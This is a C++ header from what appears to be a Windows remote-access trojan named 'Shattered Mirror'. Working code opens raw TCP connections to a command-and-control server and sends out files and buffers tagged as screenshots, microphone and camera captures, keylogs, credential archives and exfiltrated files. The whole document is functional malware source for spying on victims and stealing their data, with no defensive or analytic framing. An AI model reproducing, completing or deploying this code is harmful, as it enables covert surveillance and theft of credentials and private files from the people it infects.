#pragma once
/*=============================================================================
 * Shattered Mirror v1 — TurboSend: Raw TCP fast-path for large data
 * 
 * Include AFTER <winsock2.h> and "Config.h" in any atom that needs it.
 * For atoms that don't currently use sockets, add:
 *   #include <winsock2.h>
 *   #include <ws2tcpip.h>
 *   #pragma comment(lib, "ws2_32.lib")
 * BEFORE including this header.
 *
 * Sends data as:  [TAG] size=N\0<raw_bytes>
 * The Bouncer routes anything starting with '[' to the Turbo TCP listener.
 * The Console saves files based on the tag.
 *
 * Tags:
 *   SCREENSHOT  → live_screen (.png)
 *   SPY_MIC     → live_mic (.wav)
 *   SPY_CAM     → live_cam (.bmp)
 *   EXFIL       → exfil file (.bin, with filename in tag)
 *   KEYLOG      → keylog dump (.txt)
 *   CREDS       → credential archive (.zip)
 *   FILESCAN    → file scan results (.txt)
 *   FS_FILE     → inline file exfil (.bin)
 *===========================================================================*/

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <cstdio>
#include "Config.h"

#pragma comment(lib, "ws2_32.lib")

namespace Turbo {

/*---------------------------------------------------------------------------
 *  Send — Fire-and-forget raw TCP send to C2.
 *  tag     : e.g. "EXFIL" or "CREDS" — becomes [EXFIL] in the header
 *  pData   : raw bytes to send
 *  dwLen   : length of pData
 *  szExtra : optional extra info appended to header (e.g. filename)
 *            Format becomes: [TAG extra] size=N\0<bytes>
 *  Returns TRUE if all bytes were sent successfully.
 *-------------------------------------------------------------------------*/
static inline BOOL Send(const char* tag, const BYTE* pData, DWORD dwLen, 
                        const char* szExtra = NULL) {
    char domain[256] = {0};
    int port = 0;
    Config::GetActiveC2Target(domain, sizeof(domain), &port);

    // WSAStartup is ref-counted — safe to call even if already initialized
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;

    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct hostent *host = gethostbyname(domain);
    if (!host) { closesocket(sock); WSACleanup(); return FALSE; }

    SOCKADDR_IN sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons((u_short)port);
    sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR) {
        closesocket(sock); WSACleanup(); return FALSE;
    }

    // Build header: [TAG extra] size=N\0
    char header[256];
    if (szExtra && szExtra[0] != '\0')
        sprintf_s(header, "[%s %s] size=%lu", tag, szExtra, dwLen);
    else
        sprintf_s(header, "[%s] size=%lu", tag, dwLen);
    
    send(sock, header, (int)strlen(header) + 1, 0);  // +1 for null terminator

    // Send raw data in chunks
    DWORD sent = 0;
    while (sent < dwLen) {
        int toSend = (int)min((DWORD)65536, dwLen - sent);
        int result = send(sock, (const char*)(pData + sent), toSend, 0);
        if (result <= 0) break;
        sent += (DWORD)result;
    }

    closesocket(sock);
    WSACleanup();
    return (sent == dwLen);
}

/*---------------------------------------------------------------------------
 *  SendFile — Read a file from disk and turbo-send it.
 *  tag      : e.g. "EXFIL" or "CREDS"
 *  szPath   : path to the file on disk
 *  Returns TRUE if successful.
 *-------------------------------------------------------------------------*/
static inline BOOL SendFile(const char* tag, const char* szPath) {
    HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize == INVALID_FILE_SIZE) { 
        CloseHandle(hFile); return FALSE; 
    }

    // Read entire file into memory
    BYTE* pBuf = (BYTE*)malloc(dwSize);
    if (!pBuf) { CloseHandle(hFile); return FALSE; }

    DWORD dwRead = 0;
    BOOL ok = ReadFile(hFile, pBuf, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    if (!ok || dwRead != dwSize) { free(pBuf); return FALSE; }

    // Extract filename from path
    const char* fileName = strrchr(szPath, '\\');
    if (fileName) fileName++; else fileName = szPath;

    BOOL result = Send(tag, pBuf, dwSize, fileName);
    free(pBuf);
    return result;
}

} // namespace Turbo
